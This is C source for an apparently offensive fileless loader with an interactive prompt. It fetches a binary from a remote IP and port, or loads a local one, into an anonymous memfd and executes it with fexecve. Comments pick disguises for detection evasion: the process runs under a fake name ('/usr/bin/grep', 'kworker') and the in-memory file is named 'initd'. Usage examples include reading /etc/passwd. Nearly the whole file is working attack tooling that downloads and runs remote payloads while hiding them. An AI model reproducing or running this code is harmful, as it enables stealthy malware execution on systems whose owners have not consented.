#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>

#define MAX_INPUTLEN 256
#define MAX_SOCKBUFF 1024
#define MAX_FILESIZE 1024 * 1024 * 100

// "[kworker/0:0-worker]" or "/usr/bin/echo" seem to be stealthy as well
#define FAKE_CMDPATH "/usr/bin/grep"
// "kworker-event" or "scsi" are good candidates too, in my opinion
#define MEMFD_FDNAME "initd"

#define __NR_memfd_create 319
#define MFD_CLOEXEC 1

extern char **environ;

static inline int memfd_create(const char *name, unsigned int flags)
{
    return syscall(__NR_memfd_create, name, flags);
}

int memexec_local(char *path, char **argv)
{
    int fd;
    FILE *fs;

    // Create FD in memory and open the specified local binary
    if ((fd = memfd_create(MEMFD_FDNAME, MFD_CLOEXEC)) < 0)
        goto cleanup_local;
    if ((fs = fopen(path, "rb")) == NULL)
        goto cleanup_local;

    // Get local binary size, allocate a buffer for it
    fseek(fs, 0, SEEK_END);
    long sz = ftell(fs);
    if (sz > MAX_FILESIZE)
        goto cleanup_local;

    char *buff = malloc(sz);
    rewind(fs);

    // Load binary content into in-memory file
    fread(buff, sz, 1, fs);
    write(fd, buff, sz);
    fclose(fs);

    // Execute the loaded in-memory file from a fork'd child
    if (fork() == 0)
    {
        int err = fexecve(fd, argv, environ);
        exit(err);
    }
    // Wait for the fork'd child to complete its job
    else
    {
        int status = 0;
        wait(&status);
    }
    close(fd);
    return 0;

cleanup_local:
    if (fd > 0)
        close(fd);
    if (fs > 0)
        fclose(fs);
    perror("Error");
    return 1;
}

int memexec_remote(char *ip, char *portstr, char **argv)
{
    int fd, s, port;
    struct sockaddr_in addr;

    // Parse port and IP strings to big-endian int
    if ((port = strtoul(portstr, NULL, 10)) == 0)
        goto cleanup_remote;
    if (inet_pton(AF_INET, ip, &(addr.sin_addr)) != 1)
        goto cleanup_remote;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    // Create FD in memory and connect to the specified IP
    if ((fd = memfd_create(MEMFD_FDNAME, MFD_CLOEXEC)) < 0)
        goto cleanup_remote;
    if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        goto cleanup_remote;
    if (connect(s, (struct sockaddr *)&addr, 16) < 0)
        goto cleanup_remote;

    // Read data from a created socket and load it into in-memory file
    int chunk = 0, total = 0;
    char buff[MAX_SOCKBUFF];
    while (1)
    {
        int chunk = read(s, buff, MAX_SOCKBUFF);
        if (chunk < 0)
            goto cleanup_remote;
        total += chunk;
        write(fd, buff, chunk);
        if (chunk < MAX_SOCKBUFF)
            break;
        if (total > MAX_FILESIZE)
            goto cleanup_remote;
    }
    close(s);

    // Execute the loaded in-memory file from a fork'd child
    if (fork() == 0)
    {
        int err = fexecve(fd, argv, environ);
        exit(err);
    }
    // Wait for the fork'd child to complete its job
    else
    {
        int status = 0;
        wait(&status);
    }
    close(fd);
    return 0;

cleanup_remote:
    if (fd > 0)
        close(fd);
    if (s > 0)
        close(s);
    perror("Error");
    return 1;
}

int parse(char *cmdline)
{
    char *rest = cmdline;
    cmdline[strlen(cmdline) - 1] = ' ';
    char *cmdtype = strtok_r(rest, " ", &rest);

    // Example: remote <ip> <port>
    // Example: remote 127.0.0.1 4444
    if (strcmp(cmdtype, "remote") == 0)
    {
        char *ip, *port;
        ip = (char *)strtok_r(rest, " ", &rest);
        if (ip == NULL)
        {
            printf("Error: Not enough arguments\n");
            return 1;
        }
        port = (char *)strtok_r(rest, " ", &rest);
        if (port == NULL)
        {
            printf("Error: Not enough arguments\n");
            return 1;
        }
        if (strtok_r(rest, " ", &rest) != NULL)
        {
            printf("Error: Too many arguments\n");
            return 1;
        }
        // Do not support dynamic cmdline from remote
        char *argv[2] = {FAKE_CMDPATH, NULL};
        // Download and execute payload
        return memexec_remote(ip, port, argv);
    }

    // Example: local <path> <argv>
    // Example: local /usr/bin/whoami
    // Example: local /usr/sbin/iptables -L -n
    // Example: local /usr/bin/cat /etc/passwd
    else if (strcmp(cmdtype, "local") == 0)
    {
        char *path, *arg;
        path = strtok_r(rest, " ", &rest);
        if (path == NULL)
        {
            printf("Error: Not enough arguments\n");
            return 1;
        }
        // Fill user-entered arguments
        char *argv[32] = {FAKE_CMDPATH};
        char **argvptr = argv;
        int i = 1;
        while ((arg = strtok_r(rest, " ", &rest)) != NULL)
        {
            argvptr[i++] = arg;
            if (i >= 31)
            {
                printf("Error: Too many arguments\n");
                return 1;
            }
        }
        // Load and execute payload
        return memexec_local(path, argv);
    }

    else
    {
        printf("Error: Unknown command. Choices are:\n\
        remote <ip> <port>\n\
        local <path> <argv>\n");
        return 1;
    }
}

int main(int argc, char **argv)
{
    char inputbuff[MAX_INPUTLEN + 1];

    // Init command prompt loop
    while (1)
    {
        printf("# ");
        fgets(inputbuff, MAX_INPUTLEN, stdin);
        size_t len = strlen(inputbuff);
        if (len == 1)
        {
            continue;
        }
        if (inputbuff[len - 1] != '\n')
        {
            char ch;
            while (((ch = getchar()) != '\n') && (ch != EOF))
            {
                ;
            }
            printf("Error: Input string is too long\n");
            continue;
        }
        // Parse user-entered command
        parse(inputbuff);
    }
}